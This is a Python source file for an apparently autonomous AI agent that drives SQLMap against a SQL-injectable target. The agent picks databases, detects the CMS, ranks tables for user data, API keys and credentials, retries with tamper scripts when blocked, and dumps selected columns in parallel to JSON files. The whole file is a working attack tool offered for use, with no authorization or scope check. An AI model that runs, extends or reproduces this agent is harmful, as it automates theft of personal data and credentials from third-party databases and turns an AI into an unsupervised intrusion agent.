"""
DumpAI Agent v3.0 - Full AI Integration

This is a complete rewrite following hackingBuddyGPT patterns:
- AI makes decisions at EVERY stage (not just CMS detection)
- Reason -> Act -> Observe -> Adapt cycle
- Dynamic strategy adaptation
- Intelligent error recovery

Unlike v2.x which used hardcoded phases with optional AI,
v3 is AI-first: the Planner controls all decisions.
"""
import json
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Any, Dict, List, Optional

try:
    from .memory import Memory
    from .planner import Planner, ActionType, Observation, Decision
    from .strategy import StrategyManager, Strategy
    from .tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns, ParallelTableDumper
    )
    from .cms_strategies import (
        detect_cms_from_tables, get_extraction_plan, detect_prefix, get_cms_info
    )
    from .console import DumpAIConsole, LogLevel
except ImportError:
    from memory import Memory
    from planner import Planner, ActionType, Observation, Decision
    from strategy import StrategyManager, Strategy
    from tools import (
        EnumerateDBs, EnumerateTables, GetColumns, SearchTables, SearchColumns,
        DumpTable, DumpColumns, AnalyzeSchema, AnalyzeColumns, ParallelTableDumper
    )
    from cms_strategies import (
        detect_cms_from_tables, get_extraction_plan, detect_prefix, get_cms_info
    )
    from console import DumpAIConsole, LogLevel


BANNER = """
░█▀▄░█░█░█▄█░█▀█░█▀█░▀█▀
░█░█░█░█░█░█░█▀▀░█▀█░░█░
░▀▀░░▀▀▀░▀░▀░▀░░░▀░▀░▀▀▀

  AI-Powered Autonomous Agent
  v3.0 - Full AI Integration
  
  hackingBuddyGPT-inspired architecture
"""


class DumpAgentV3:
    """
    DumpAI Agent v3.0 - Full AI Integration
    
    Architecture (inspired by hackingBuddyGPT):
    - Planner: Central AI brain for all decisions
    - StrategyManager: Adaptive strategy selection
    - Memory: Full context for AI reasoning
    - Tools: Action executors
    - Console: Rich output with AI reasoning visibility
    
    Flow:
    1. INIT: Parse config, initialize components
    2. DISCOVERY: AI analyzes injection, discovers DB/tables
    3. PRIORITIZATION: AI scores tables by value
    4. EXTRACTION: AI guides targeted extraction
    5. ADAPTATION: AI handles errors, changes strategy
    
    Verbosity levels:
    - 0: Minimal output (phases and results only)
    - 1 (-v): Show AI reasoning summaries
    - 2 (-vv): Full AI reasoning and all decisions
    """
    
    def __init__(self, command: str, categories: Optional[List[str]] = None,
                 output_dir: str = "dumpai_out", max_parallel: int = 5,
                 verbosity: int = 0, max_rows: int = 0,
                 cms_override: str = None, prefix_override: str = None,
                 debug_log: str = None):
        
        self.config = self._parse_command(command)
        self.categories = categories or ["user_data", "api_key", "sys_data"]
        self.output_dir = output_dir
        self.max_parallel = max_parallel
        self.verbosity = verbosity
        self.max_rows = max_rows
        self.cms_override = cms_override
        self.prefix_override = prefix_override
        
        self.console = DumpAIConsole(
            verbosity=verbosity,
            debug_file=debug_log
        )
        
        os.makedirs(output_dir, exist_ok=True)
        
        self.memory = Memory()
        self.memory.current_database = self.config.get("database", "")
        
        self.planner = Planner(verbosity=verbosity)
        self.strategy_manager = StrategyManager(
            planner=self.planner,
            memory=self.memory,
            verbosity=verbosity
        )
        
        self._init_tools()
        
        self.parallel_dumper = ParallelTableDumper(
            config=self.config,
            verbose=verbosity > 0,
            max_table_workers=min(3, max_parallel),
            max_column_workers=max_parallel,
            output_base=output_dir
        )
        
        self.round_num = 0
        self.max_rounds = 200
    
    def _parse_command(self, cmd: str) -> Dict:
        """Parse SQLMap command."""
        config = {
            "base_cmd": cmd,
            "database": "",
            "request_file": "",
            "parameter": ""
        }
        
        d_match = re.search(r'-D\s+(\S+)', cmd)
        if d_match:
            config["database"] = d_match.group(1)
        
        r_match = re.search(r'-r\s+["\']?([^"\'\s]+)["\']?', cmd)
        if r_match:
            config["request_file"] = r_match.group(1)
        
        p_match = re.search(r'-p\s+["\']?([^"\'\s]+)["\']?', cmd)
        if p_match:
            config["parameter"] = p_match.group(1)
        
        return config
    
    def _init_tools(self):
        """Initialize all tools."""
        verbose = self.verbosity > 0
        self.tools = {
            "enumerate_dbs": EnumerateDBs(self.config, verbose=verbose),
            "enumerate_tables": EnumerateTables(self.config, verbose=verbose),
            "get_columns": GetColumns(self.config, verbose=verbose),
            "search_tables": SearchTables(self.config, verbose=verbose),
            "search_columns": SearchColumns(self.config, verbose=verbose),
            "dump_table": DumpTable(self.config, verbose=verbose),
            "dump_columns": DumpColumns(self.config, verbose=verbose),
            "analyze_schema": AnalyzeSchema(self.config, verbose=verbose),
            "analyze_columns": AnalyzeColumns(self.config, verbose=verbose)
        }
    
    def _execute_tool(self, tool_name: str, max_retries: int = 2, **params) -> Optional[Any]:
        """Execute a tool with AI-guided retry on failure."""
        tool = self.tools.get(tool_name)
        if not tool:
            self.console.log(f"Unknown tool: {tool_name}", LogLevel.ERROR)
            return None
        
        retry_count = 0
        current_params = params.copy()
        
        while retry_count <= max_retries:
            self.round_num += 1
            self.console.round_start(self.round_num, tool_name, current_params)
            
            result = tool.execute(**current_params)
            
            summary = f"{len(result.data)} items" if result.success and result.data else result.error or "No data"
            self.console.round_result(result.success, summary, result.data)
            
            self.memory.add_action(
                tool=tool_name,
                params=current_params,
                result=result.data if result.success else None,
                success=result.success,
                execution_time=result.execution_time
            )
            
            if result.success:
                self.strategy_manager.report_success()
                return result
            
            # FAILURE - ask AI for adaptation
            self.memory.add_error(tool_name, result.error, current_params)
            
            # Use Planner AI to decide recovery action
            ai_adaptation = self.planner.adapt_to_error(
                error=result.error or "Unknown error",
                context=result.raw_output[-2000:] if result.raw_output else "",
                failed_action=tool_name
            )
            
            if self.verbosity >= 1:
                print(f"[ADAPT] AI suggestion: {ai_adaptation}")
            
            if not ai_adaptation.get("should_retry", False):
                # AI says don't retry - skip this
                if ai_adaptation.get("skip_reason"):
                    self.console.log(f"AI skip: {ai_adaptation['skip_reason']}", LogLevel.WARN)
                break
            
            # AI says retry - update params
            retry_count += 1
            self.console.log(f"AI retry {retry_count}/{max_retries}: {ai_adaptation.get('reasoning', '')}", LogLevel.INFO)
            
            # Apply AI-suggested parameter changes
            new_params = ai_adaptation.get("new_params", {})
            if new_params:
                # Handle add_flags specially - append to config for tools
                if "add_flags" in new_params:
                    existing = self.config.get("extra_flags", "")
                    self.config["extra_flags"] = f"{existing} {new_params['add_flags']}".strip()
                    del new_params["add_flags"]
                if "threads_override" in new_params:
                    self.config["threads_override"] = new_params["threads_override"]
                    del new_params["threads_override"]
                current_params.update(new_params)
            
            # Apply tamper script if suggested
            if ai_adaptation.get("tamper_script"):
                existing = self.config.get("extra_flags", "")
                tamper = ai_adaptation["tamper_script"]
                self.config["extra_flags"] = f"{existing} --tamper={tamper}".strip()
            
            # Apply technique override if suggested
            if ai_adaptation.get("technique_override"):
                self.config["technique_override"] = ai_adaptation["technique_override"]
            
            # Strategy manager also tracks
            config, adaptation = self.strategy_manager.adapt_to_error(
                error=result.error,
                failed_tool=tool_name
            )
            
            if adaptation.get("strategy_change"):
                self.console.ai_reason(
                    reasoning=adaptation.get("reasoning", "Error detected, changing strategy"),
                    decision=f"Switch to {adaptation['strategy_change']}"
                )
        
        return result
    
    def run(self):
        """Main agent loop - AI-controlled execution."""
        print(BANNER)
        start_time = time.time()
        
        self.console.phase("AUTONOMOUS AI AGENT")
        self.console.log(f"Request: {self.config['request_file']}")
        self.console.log(f"Categories: {', '.join(self.categories)}")
        self.console.log(f"Output: {self.output_dir}")
        if self.verbosity >= 1:
            self.console.log(f"Verbosity: {self.verbosity}")
        
        self.console.phase("PHASE 1: INJECTION ANALYSIS")
        
        database = self.config.get("database")
        
        result = self._execute_tool("enumerate_dbs")
        
        if not result or not result.success:
            self.console.error_panel(
                "Failed to probe target",
                "Check if the target is reachable and SQLMap command is correct"
            )
            return
        
        injection_analysis = self.planner.analyze_injection(result.raw_output)
        
        self.console.injection_analysis(injection_analysis)
        
        self.memory.injection_type = injection_analysis.get("injection_type", "unknown")
        self.memory.available_techniques = injection_analysis.get("available_techniques", "")
        
        # Update config so tools can filter --technique to only available ones
        self.config["available_techniques"] = self.memory.available_techniques
        
        if self.verbosity >= 1 and self.memory.available_techniques:
            self.console.log(f"Available techniques: {self.memory.available_techniques}")
        
        if injection_analysis.get("reasoning"):
            self.console.ai_reason(
                reasoning=injection_analysis.get("reasoning", ""),
                decision=injection_analysis.get("recommended_strategy", "continue"),
                confidence=0.9 if injection_analysis.get("injection_type") != "unknown" else 0.5
            )
        
        self.memory.add_hypothesis(
            type="injection",
            value=self.memory.injection_type,
            confidence=0.9 if injection_analysis else 0.5,
            source="planner.analyze_injection"
        )
        
        self.strategy_manager.select_initial_strategy(injection_analysis)
        
        self.console.phase("PHASE 2: DATABASE SELECTION")
        
        if not database:
            if result.data:
                self.memory.databases = result.data
                
                system_dbs = {'information_schema', 'mysql', 'performance_schema', 'sys', 'test'}
                user_dbs = [db for db in result.data if db.lower() not in system_dbs]
                
                if user_dbs:
                    database = user_dbs[0]
                    self.console.ai_reason(
                        reasoning=f"Found {len(result.data)} databases. Filtering out system databases.",
                        decision=f"Selected '{database}' as target (first user database)"
                    )
                else:
                    database = result.data[0]
                    self.console.log(f"Using database: {database}")
                
                self.memory.current_database = database
        else:
            self.console.log(f"Database specified: {database}")
            self.memory.current_database = database
        
        self.console.phase("PHASE 3: TABLE DISCOVERY")
        
        use_smart_search = (
            injection_analysis.get("is_slow") or 
            self.strategy_manager.current_strategy == Strategy.SMART_SEARCH
        )
        
        if use_smart_search:
            self.console.ai_reason(
                reasoning="Slow injection detected (time-based or boolean blind). Full enumeration would take too long.",
                decision="Use Smart Search - search for specific table patterns instead of enumerating all"
            )
            tables = self._smart_search_tables(database)
        else:
            self.console.log("Full table enumeration", LogLevel.INFO)
            result = self._execute_tool("enumerate_tables", database=database)
            tables = result.data if result and result.success else []
        
        if not tables:
            self.console.error_panel(
                "No tables found",
                "Target database may be empty or access is restricted"
            )
            return
        
        self.memory.tables = tables
        self.console.log(f"Discovered {len(tables)} tables", LogLevel.SUCCESS)
        
        self.console.phase("PHASE 4: AI CMS DETECTION & PRIORITIZATION")
        
        if self.cms_override:
            cms_detected = self.cms_override.lower()
            self.console.log(f"CMS override: {cms_detected}")
        else:
            cms_detected = detect_cms_from_tables(tables)
        
        if cms_detected:
            self.memory.cms_detected = cms_detected
            self.console.ai_reason(
                reasoning=f"Table naming patterns match known CMS structure",
                decision=f"Detected CMS: {cms_detected.upper()}"
            )
            
            self.strategy_manager.adapt_to_cms(cms_detected)
            
            self.memory.add_hypothesis(
                type="cms",
                value=cms_detected,
                confidence=0.95,
                source="cms_strategies.detect_cms"
            )
            
            prefix = self.prefix_override or detect_prefix(tables, cms_detected)
            self.console.log(f"Table prefix: {prefix}")
            
            cms_plan = get_extraction_plan(cms_detected, prefix, self.categories)
            
            if cms_plan:
                self.console.log(f"CMS strategy: {len(cms_plan)} target tables", LogLevel.AI)
                extraction_plan = cms_plan
            else:
                extraction_plan = None
        else:
            extraction_plan = None
        
        if not extraction_plan:
            self.console.log("Using AI table prioritization", LogLevel.AI)
            
            prioritized = self.planner.prioritize_tables(
                tables=tables,
                categories=self.categories,
                cms_detected=self.memory.cms_detected,
                context=self.memory.get_context_for_ai()
            )
            
            self.console.table_priority(prioritized)
            
            extraction_plan = {}
            
            # Normalize table names for comparison (handle db.table format)
            tables_lower = set()
            for t in tables:
                tables_lower.add(t.lower())
                if '.' in t:
                    tables_lower.add(t.split('.', 1)[1].lower())
            
            for item in prioritized[:20]:
                table = item["table"]
                table_check = table.lower()
                if '.' in table:
                    table_check = table.split('.', 1)[1].lower()
                
                # CRITICAL: Verify table actually exists (prevent AI hallucination)
                if table_check not in tables_lower:
                    if self.verbosity >= 1:
                        self.console.log(f"Skip {table}: AI hallucinated (not in discovered tables)", LogLevel.DEBUG)
                    continue
                
                item_category = item.get("category", "")
                
                if item_category and item_category not in self.categories:
                    if self.verbosity >= 2:
                        self.console.log(f"Skip {table}: category {item_category} not requested", LogLevel.DEBUG)
                    continue
                
                self.memory.update_table_score(table, item["score"])
                extraction_plan[table] = item.get("columns_hint", [])
        
        if not extraction_plan:
            self.console.error_panel(
                "No extraction targets identified",
                "Try different categories or check table names"
            )
            return
        
        self.console.phase("PHASE 5: AI-GUIDED PARALLEL EXTRACTION")
        
        total_rows = 0
        
        columns_map = {}
        tables_to_dump = list(extraction_plan.keys())
        
        self.console.log(f"Preparing {len(tables_to_dump)} tables for extraction")
        
        failed_tables = []
        for idx, table in enumerate(tables_to_dump[:20]):
            suggested_cols = extraction_plan.get(table, [])
            
            col_result = self._execute_tool("get_columns", database=database, table=table)
            
            if col_result and col_result.success and col_result.data:
                all_columns = col_result.data
                self.memory.columns_cache[table] = all_columns
                
                column_selection = self.planner.select_extraction_columns(
                    table=table,
                    columns=all_columns,
                    categories=self.categories,
                    context=self.memory.get_context_for_ai()
                )
                
                if column_selection and column_selection.get("extractions"):
                    cols = []
                    for ext in column_selection["extractions"]:
                        ext_cols = ext.get("columns", [])
                        valid_cols = [c for c in ext_cols if c in all_columns]
                        cols.extend(valid_cols)
                    
                    columns_map[table] = list(set(cols)) if cols else all_columns[:10]
                    
                    if self.verbosity >= 1 and column_selection.get("reasoning"):
                        self.console.ai_reason(
                            reasoning=column_selection.get("reasoning", ""),
                            decision=f"Extract columns: {', '.join(columns_map[table][:5])}..."
                        )
                elif suggested_cols:
                    columns_map[table] = [c for c in suggested_cols if c in all_columns][:10]
                else:
                    columns_map[table] = all_columns[:10]
            else:
                failed_tables.append(table)
                self.console.log(f"SKIP {table}: no columns found", LogLevel.WARN)
        
        if failed_tables and len(failed_tables) == len(tables_to_dump[:20]):
            self.console.log("All CMS tables failed! Falling back...", LogLevel.WARN)
            fallback_tables = [t for t in self.memory.tables if t not in failed_tables][:10]
            for table in fallback_tables:
                col_result = self._execute_tool("get_columns", database=database, table=table)
                if col_result and col_result.success and col_result.data:
                    columns_map[table] = col_result.data[:10]
                    self.memory.columns_cache[table] = col_result.data
        
        columns_map = {k: v for k, v in columns_map.items() if v}
        
        self.console.log(f"Starting PARALLEL dump: {len(columns_map)} tables")
        self.console.log(f"  Table workers: {self.parallel_dumper.max_table_workers}", LogLevel.DEBUG)
        self.console.log(f"  Column workers: {self.parallel_dumper.max_column_workers}", LogLevel.DEBUG)
        
        results = self.parallel_dumper.dump_tables_parallel(
            database=database,
            tables=list(columns_map.keys()),
            columns_map=columns_map,
            max_rows=self.max_rows
        )
        
        for table, result in results.items():
            if result.success and result.data:
                category = self.categories[0] if self.categories else "user_data"
                self._add_extracted_data(table, result.data, category)
                total_rows += len(result.data)
                self.console.log(f"OK {table}: {len(result.data)} rows", LogLevel.SUCCESS)
            else:
                self.console.log(f"FAIL {table}: {result.error}", LogLevel.ERROR)
            
            self.memory.stats["tables_processed"] += 1
        
        self.console.phase("EXTRACTION COMPLETE")
        
        self.memory.stats["duration"] = time.time() - start_time
        self._save_results()
        
        self._print_summary()
        
        self.console.close()
    
    def _smart_search_tables(self, database: str) -> List[str]:
        """AI-optimized Smart Search for slow injections."""
        patterns = self._get_search_patterns()
        
        self.console.log(f"Searching {len(patterns)} patterns", LogLevel.DEBUG)
        
        result = self._execute_tool(
            "search_tables", 
            patterns=patterns,
            database=database,
            parallel=True,
            max_workers=self.max_parallel
        )
        
        if result and result.success and result.data:
            tables = []
            for item in result.data:
                table_name = item.split('.')[-1] if '.' in item else item
                if table_name not in tables:
                    tables.append(table_name)
            return tables
        
        self.console.log("Smart search failed, falling back to enumeration", LogLevel.WARN)
        result = self._execute_tool("enumerate_tables", database=database)
        return result.data if result and result.success else []
    
    def _get_search_patterns(self) -> List[str]:
        """Get search patterns for Smart Search."""
        patterns = set()
        
        category_patterns = {
            "user_data": ["employee", "admin", "user", "staff", "member", "account"],
            "customer_data": ["customer", "client", "address", "order"],
            "sys_data": ["config", "setting", "option", "connection"],
            "api_key": ["api", "key", "token", "oauth", "credential", "webservice"],
            "email_pass": ["user", "member", "account", "login"]
        }
        
        for cat in self.categories:
            if cat in category_patterns:
                patterns.update(category_patterns[cat])
        
        patterns.update(["employee", "shop", "users", "posts", "product", "admin_user"])
        
        return list(patterns)
    
    def _add_extracted_data(self, table: str, rows: List[Dict], 
                            category: str = None):
        """Add extracted data to memory."""
        if not category:
            category = self.categories[0] if self.categories else "user_data"
        
        self.memory.add_extracted_data(category, rows, source_table=table)
    
    def _save_results(self):
        """Save extracted data only (clean output)."""
        # Save each table as separate JSON file
        for category, items in self.memory.extracted_data.items():
            for item in items:
                source = item.get('source', 'unknown')
                rows = item.get('data', [])
                
                if rows:
                    table_file = os.path.join(self.output_dir, f"{source}.json")
                    with open(table_file, 'w') as f:
                        json.dump(rows, f, indent=2, default=str)
        
        # Save combined results (data only)
        combined = {}
        for category, items in self.memory.extracted_data.items():
            for item in items:
                source = item.get('source', 'unknown')
                rows = item.get('data', [])
                if rows:
                    combined[source] = rows
        
        if combined:
            output_file = os.path.join(self.output_dir, "dump_all.json")
            with open(output_file, 'w') as f:
                json.dump(combined, f, indent=2, default=str)
            
            self.console.log(f"Results saved: {output_file}", LogLevel.SUCCESS)
    
    def _print_summary(self):
        """Print extraction summary."""
        summary = self.memory.get_summary()
        planner_stats = self.planner.get_stats()
        strategy_stats = self.strategy_manager.get_stats()
        
        stats = {
            "duration_sec": round(summary.get('duration', 0), 1),
            "tables_processed": summary.get('tables_processed', 0),
            "rows_extracted": summary.get('rows_extracted', 0),
            "ai_calls": planner_stats.get('ai_calls', 0),
            "ai_tokens": planner_stats.get('total_tokens', 0),
            "strategy_changes": strategy_stats.get('strategy_changes', 0),
            "final_strategy": strategy_stats.get('current_strategy', 'unknown')
        }
        
        self.console.summary_table(stats)
        
        # Show extracted data preview
        self.console.show_extracted_data(self.memory.extracted_data)
